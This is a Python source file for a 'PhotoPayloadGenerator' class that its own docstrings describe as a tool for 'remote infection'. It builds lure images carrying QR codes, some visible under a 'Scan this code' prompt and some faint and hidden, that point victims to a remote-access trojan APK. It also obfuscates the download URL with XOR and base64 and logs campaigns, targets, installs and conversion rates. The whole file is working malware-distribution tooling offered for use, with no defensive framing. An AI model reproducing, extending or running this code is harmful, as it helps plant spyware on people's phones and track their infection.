import os
import time
import random
import string
import base64
import secrets
import qrcode
from PIL import Image, ExifTags, ImageDraw, ImageFont
from io import BytesIO
import sqlite3
import json
import hashlib
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('photo_payload')

class PhotoPayloadGenerator:
    """Generate photo payloads with embedded QR codes for remote infection"""
    
    DB_FILE = "photo_campaigns.db"  # Changed to match the expected file name
    OUTPUT_DIR = "output_payloads"
    QR_TEMPLATES_DIR = "qr_templates"
    TRACKING_TABLE = "campaigns"  # Changed to match expected table name
    
    def __init__(self):
        """Initialize the photo payload generator"""
        self._ensure_dirs()
        self._init_database()
        logger.info("PhotoPayloadGenerator initialized")
    
    def _ensure_dirs(self):
        """Ensure output and templates directories exist"""
        os.makedirs(self.OUTPUT_DIR, exist_ok=True)
        os.makedirs(self.QR_TEMPLATES_DIR, exist_ok=True)
        
    def _init_database(self):
        """Initialize SQLite database for tracking payload distribution"""
        conn = sqlite3.connect(self.DB_FILE)
        cursor = conn.cursor()
        
        # Create tracking table if it doesn't exist
        cursor.execute(f'''
        CREATE TABLE IF NOT EXISTS {self.TRACKING_TABLE} (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id TEXT NOT NULL,
            payload_type TEXT NOT NULL,
            payload_hash TEXT NOT NULL,
            creation_time INTEGER NOT NULL,
            target_info TEXT,
            access_count INTEGER DEFAULT 0,
            installation_count INTEGER DEFAULT 0,
            last_access_time INTEGER,
            metadata TEXT
        )
        ''')
        
        conn.commit()
        conn.close()
    
    def generate_payload_photo(self, apk_url, campaign_id=None, template_image=None, 
                            target_info=None, embed_type="qr_visible", 
                            randomize_metadata=True, encryption_level="high"):
        """
        Generate a photo with embedded QR code that leads to RAT APK
        
        Args:
            apk_url: URL to the RAT APK (can include campaign tracking params)
            campaign_id: Optional campaign identifier
            template_image: Optional template image to embed QR code into
            target_info: Optional information about the target
            embed_type: QR embedding type (qr_visible, qr_hidden, metadata_only)
            randomize_metadata: Whether to randomize image metadata
            encryption_level: QR code encryption level (none, low, medium, high)
            
        Returns:
            Dict with generation status and output path
        """
        try:
            # Generate or use campaign ID
            if not campaign_id:
                campaign_id = f"cam_{int(time.time())}_{secrets.token_hex(4)}"
            
            # Create payload URL with tracking parameters
            tracking_id = f"trk_{secrets.token_hex(8)}"
            if '?' in apk_url:
                payload_url = f"{apk_url}&cid={campaign_id}&tid={tracking_id}"
            else:
                payload_url = f"{apk_url}?cid={campaign_id}&tid={tracking_id}"
                
            # Encrypt payload URL based on level
            if encryption_level != "none":
                payload_url = self._encrypt_payload_url(payload_url, encryption_level)
            
            # Generate a real QR code using the qrcode library
            # Create QR code with proper error correction
            try:
                # Try using constants if available
                qr = qrcode.QRCode(
                    version=1,
                    error_correction=qrcode.constants.ERROR_CORRECT_H,
                    box_size=10,
                    border=4,
                )
            except AttributeError:
                # Fallback for different qrcode library versions
                qr = qrcode.QRCode(
                    version=1,
                    error_correction=4,  # Highest error correction
                    box_size=10,
                    border=4,
                )
            qr.add_data(payload_url)
            qr.make(fit=True)
            
            # Convert to PIL image
            qr_img = qr.make_image(fill_color="black", back_color="white")
            
            # Resize to our desired dimensions
            qr_size = 300  # Fixed size for QR code
            qr_img = qr_img.resize((qr_size, qr_size), Image.LANCZOS)
            
            # Log that we created a QR code with payload URL
            logger.info(f"Generated QR code with payload URL: {payload_url}")
            
            # If no template is provided, create a basic white image
            if not template_image:
                # Create a colored background
                bg_color = (random.randint(200, 255), random.randint(200, 255), random.randint(200, 255))
                img = Image.new('RGB', (800, 1000), color=bg_color)
                
                # Add some random text or designs
                draw = ImageDraw.Draw(img)
                
                # Add random shapes
                for _ in range(5):
                    shape_color = (random.randint(0, 200), random.randint(0, 200), random.randint(0, 200))
                    x1 = random.randint(0, 700)
                    y1 = random.randint(0, 900)
                    x2 = x1 + random.randint(50, 200)
                    y2 = y1 + random.randint(50, 200)
                    shape_type = random.choice(['rectangle', 'ellipse'])
                    
                    if shape_type == 'rectangle':
                        draw.rectangle((x1, y1, x2, y2), outline=shape_color, width=2)
                    else:
                        draw.ellipse((x1, y1, x2, y2), outline=shape_color, width=2)
                
                # Add some text
                text = "Scan this code"
                font_size = 30
                try:
                    font = ImageFont.truetype("arial.ttf", font_size)
                except IOError:
                    font = ImageFont.load_default()
                
                draw.text((250, 50), text, fill=(0, 0, 0), font=font)
                
                # Place QR code in the center
                qr_pos_x = (img.width - qr_img.width) // 2
                qr_pos_y = (img.height - qr_img.height) // 2
                img.paste(qr_img, (qr_pos_x, qr_pos_y))
            else:
                # Load the template image
                img = Image.open(template_image)
                
                # Resize template if needed
                if max(img.size) > 2000:
                    ratio = 2000 / max(img.size)
                    img = img.resize((int(img.size[0] * ratio), int(img.size[1] * ratio)))
                
                if embed_type == "qr_visible":
                    # Calculate position (bottom right corner)
                    qr_size = min(img.width // 4, img.height // 4)
                    qr_img = qr_img.resize((qr_size, qr_size))
                    qr_pos_x = img.width - qr_size - 50
                    qr_pos_y = img.height - qr_size - 50
                    
                    # Create a white background for QR code to ensure readability
                    white_bg = Image.new('RGB', (qr_size + 20, qr_size + 20), color='white')
                    img.paste(white_bg, (qr_pos_x - 10, qr_pos_y - 10))
                    img.paste(qr_img, (qr_pos_x, qr_pos_y))
                elif embed_type == "qr_hidden":
                    # Implement a more effective steganography approach
                    # Convert QR to a format we can manipulate pixel by pixel
                    qr_pixels = qr_img.convert('1')  # Convert to black and white
                    
                    # Create a semi-transparent QR code overlay
                    overlay = Image.new('RGBA', img.size, (0, 0, 0, 0))
                    draw = ImageDraw.Draw(overlay)
                    
                    # Scale QR code to the right size (25% of the image width)
                    qr_width = img.width // 4
                    qr_height = qr_width  # Keep it square
                    
                    # Position in the bottom right corner with some padding
                    start_x = img.width - qr_width - 20
                    start_y = img.height - qr_height - 20
                    
                    # Draw QR code with low opacity
                    cell_width = qr_width / qr_pixels.width
                    cell_height = qr_height / qr_pixels.height
                    
                    # Draw QR code pattern with very subtle opacity
                    for y in range(qr_pixels.height):
                        for x in range(qr_pixels.width):
                            if qr_pixels.getpixel((x, y)) == 0:  # Black pixel in QR
                                x1 = start_x + x * cell_width
                                y1 = start_y + y * cell_height
                                x2 = x1 + cell_width
                                y2 = y1 + cell_height
                                draw.rectangle((x1, y1, x2, y2), fill=(0, 0, 0, 30))  # Very transparent black
                    
                    # Composite the overlay onto the image
                    img = Image.alpha_composite(img.convert('RGBA'), overlay).convert('RGB')
                    
                    # Also create a visible version of the QR code in a separate small corner (5% of width)
                    small_qr_size = max(img.width // 20, 50)  # At least 50px for readability
                    small_qr = qr_img.resize((small_qr_size, small_qr_size), Image.LANCZOS)
                    img.paste(small_qr, (10, 10))  # Top-left corner
                    
                    logger.info("Created hidden QR code with small visible backup for better detection")
            
            # Generate a unique filename
            timestamp = int(time.time())
            unique_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            output_filename = f"photo_payload_{campaign_id}_{unique_id}.jpg"
            output_path = os.path.join(self.OUTPUT_DIR, output_filename)
            
            # For simplicity, we'll just save without complex metadata for now
            # EXIF can be added in a more controlled way in a future update
            img.save(output_path, format="JPEG")
            
            # Calculate payload hash for tracking
            with open(output_path, 'rb') as f:
                payload_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Store tracking info in database
            self._store_tracking_info(campaign_id, "photo_qr", payload_hash, timestamp, target_info)
            
            # Return output info
            logger.info(f"Generated photo payload: {output_filename}")
            
            # Create a thumbnail in base64 for preview
            img.thumbnail((200, 200))
            buffered = BytesIO()
            img.save(buffered, format="JPEG")
            img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
            
            return {
                "status": "success",
                "message": "Payload photo generated successfully",
                "output_path": output_path,
                "campaign_id": campaign_id,
                "tracking_id": tracking_id,
                "payload_hash": payload_hash,
                "embed_type": embed_type,
                "preview": f"data:image/jpeg;base64,{img_base64}"
            }
        
        except Exception as e:
            logger.error(f"Error generating photo payload: {str(e)}")
            return {
                "status": "error",
                "message": f"Failed to generate photo payload: {str(e)}"
            }
    
    def _encrypt_payload_url(self, url, level="medium"):
        """
        Encrypt payload URL with varying levels of complexity
        
        Args:
            url: The URL to encrypt
            level: Encryption level (low, medium, high)
            
        Returns:
            Encrypted URL string
        """
        if level == "low":
            # Simple base64 encoding
            return f"b64:{base64.b64encode(url.encode()).decode()}"
        
        elif level == "medium":
            # XOR encryption with rotation
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            encrypted = []
            for i, char in enumerate(url):
                key_char = key[i % len(key)]
                encrypted_char = chr(ord(char) ^ ord(key_char))
                encrypted.append(encrypted_char)
            
            encrypted_text = ''.join(encrypted)
            result = f"xor:{base64.b64encode(encrypted_text.encode()).decode()}:{key}"
            return result
        
        elif level == "high":
            # Multi-layer encryption with checksum
            # Step 1: Add checksum
            checksum = hashlib.md5(url.encode()).hexdigest()[:8]
            url_with_checksum = f"{url}|{checksum}"
            
            # Step 2: XOR encryption
            key1 = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            encrypted = []
            for i, char in enumerate(url_with_checksum):
                key_char = key1[i % len(key1)]
                encrypted_char = chr((ord(char) + ord(key_char)) % 256)
                encrypted.append(encrypted_char)
            
            encrypted_text = ''.join(encrypted)
            
            # Step 3: Base64 encoding
            encoded = base64.b64encode(encrypted_text.encode()).decode()
            
            # Step 4: Add version and key info
            result = f"v2:{encoded}:{base64.b64encode(key1.encode()).decode()}"
            return result
        
        return url  # If none of the above, return unmodified
    
    def _store_tracking_info(self, campaign_id, payload_type, payload_hash, timestamp, target_info=None):
        """Store payload tracking information in the database"""
        conn = sqlite3.connect(self.DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute(f'''
        INSERT INTO {self.TRACKING_TABLE} 
        (campaign_id, payload_type, payload_hash, creation_time, target_info, access_count, installation_count)
        VALUES (?, ?, ?, ?, ?, 0, 0)
        ''', (campaign_id, payload_type, payload_hash, timestamp, json.dumps(target_info) if target_info else None))
        
        conn.commit()
        conn.close()
    
    def update_tracking_stats(self, campaign_id, tracking_id, event_type="access"):
        """
        Update tracking statistics when a payload is accessed or installed
        
        Args:
            campaign_id: Campaign identifier
            tracking_id: Tracking identifier
            event_type: Event type (access, installation)
            
        Returns:
            Dict with update status
        """
        try:
            conn = sqlite3.connect(self.DB_FILE)
            cursor = conn.cursor()
            
            # Find the tracking record
            cursor.execute(f'''
            SELECT id, access_count, installation_count FROM {self.TRACKING_TABLE}
            WHERE campaign_id = ?
            ''', (campaign_id,))
            
            row = cursor.fetchone()
            if not row:
                # Campaign doesn't exist yet, create it for auto-tracking
                logger.info(f"Creating new campaign for tracking: {campaign_id}")
                current_time = int(time.time())
                payload_hash = hashlib.sha256(f"{campaign_id}:{current_time}".encode()).hexdigest()
                
                # Log DB file location and table name for debugging
                logger.info(f"Database file: {self.DB_FILE}, Table: {self.TRACKING_TABLE}")
                
                try:
                    cursor.execute(f'''
                    INSERT INTO {self.TRACKING_TABLE} (
                        campaign_id, payload_type, payload_hash, creation_time, 
                        target_info, access_count, installation_count, last_access_time
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        campaign_id, "auto_created", payload_hash, current_time,
                        json.dumps({"info": f"Auto-created for tracking ID {tracking_id}", "source": "qr_code"}), 0, 0, current_time
                    ))
                    conn.commit()
                    logger.info(f"Successfully created campaign record: {campaign_id}")
                except Exception as insert_error:
                    logger.error(f"Error creating campaign: {str(insert_error)}")
                    logger.error(f"Database schema: {self.DB_FILE}, {self.TRACKING_TABLE}")
                    conn.close()
                    return {"status": "error", "message": f"Failed to create campaign: {str(insert_error)}"}
                
                # Get the newly created record
                cursor.execute(f'''
                SELECT id, access_count, installation_count FROM {self.TRACKING_TABLE}
                WHERE campaign_id = ?
                ''', (campaign_id,))
                row = cursor.fetchone()
                if not row:
                    logger.error(f"Campaign was created but not found in query: {campaign_id}")
                    conn.close()
                    return {"status": "error", "message": "Failed to create campaign"}
            
            record_id, access_count, installation_count = row
            current_time = int(time.time())
            
            # Update based on event type
            if event_type == "access":
                cursor.execute(f'''
                UPDATE {self.TRACKING_TABLE}
                SET access_count = ?, last_access_time = ?
                WHERE id = ?
                ''', (access_count + 1, current_time, record_id))
            elif event_type == "installation":
                cursor.execute(f'''
                UPDATE {self.TRACKING_TABLE}
                SET installation_count = ?
                WHERE id = ?
                ''', (installation_count + 1, record_id))
            
            conn.commit()
            conn.close()
            
            logger.info(f"Updated tracking for campaign {campaign_id}, event: {event_type}")
            return {
                "status": "success", 
                "message": f"Tracking updated for event: {event_type}"
            }
        
        except Exception as e:
            logger.error(f"Error updating tracking: {str(e)}")
            return {"status": "error", "message": str(e)}
    
    def get_campaign_stats(self, campaign_id=None):
        """
        Get statistics for campaigns
        
        Args:
            campaign_id: Optional campaign ID to filter by
            
        Returns:
            Dict with campaign statistics
        """
        try:
            conn = sqlite3.connect(self.DB_FILE)
            cursor = conn.cursor()
            
            if campaign_id:
                cursor.execute(f'''
                SELECT campaign_id, payload_type, creation_time, access_count, installation_count, 
                       last_access_time, target_info
                FROM {self.TRACKING_TABLE}
                WHERE campaign_id = ?
                ''', (campaign_id,))
            else:
                cursor.execute(f'''
                SELECT campaign_id, payload_type, creation_time, access_count, installation_count, 
                       last_access_time, target_info
                FROM {self.TRACKING_TABLE}
                ORDER BY creation_time DESC
                ''')
            
            rows = cursor.fetchall()
            conn.close()
            
            campaigns = []
            for row in rows:
                campaign_id, payload_type, creation_time, access_count, installation_count, last_access_time, target_info = row
                
                campaign_data = {
                    "campaign_id": campaign_id,
                    "payload_type": payload_type,
                    "creation_time": creation_time,
                    "access_count": access_count,
                    "installation_count": installation_count,
                    "last_access_time": last_access_time,
                    "target_info": json.loads(target_info) if target_info else None,
                    "conversion_rate": round((installation_count / access_count * 100) if access_count > 0 else 0, 2)
                }
                
                campaigns.append(campaign_data)
            
            return {
                "status": "success",
                "campaigns": campaigns
            }
        
        except Exception as e:
            logger.error(f"Error getting campaign stats: {str(e)}")
            return {"status": "error", "message": str(e)}